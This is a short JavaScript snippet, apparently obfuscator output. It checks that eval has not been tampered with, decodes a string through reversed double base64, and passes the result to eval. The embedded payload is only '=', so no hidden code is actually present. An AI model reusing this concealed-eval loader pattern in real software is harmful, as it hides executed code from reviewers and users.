(function(){ (function(){ var nativeEvalStr = Function.prototype.toString.call(eval); if(nativeEvalStr.indexOf('[native code]') === -1){ throw new Error('eval function has been tampered with.'); } })(); function TheDigitalAlchemistCmalf(input) { var wizard = input.split('').reverse().join(''); var bitch = Buffer.from(wizard, 'base64').toString('utf8'); var buffalo = bitch.split('').reverse().join(''); var originalCode = Buffer.from(buffalo, 'base64').toString('utf8'); return originalCode; } var TheDigitalAlchemistcodes = TheDigitalAlchemistCmalf('='); eval(TheDigitalAlchemistcodes); })();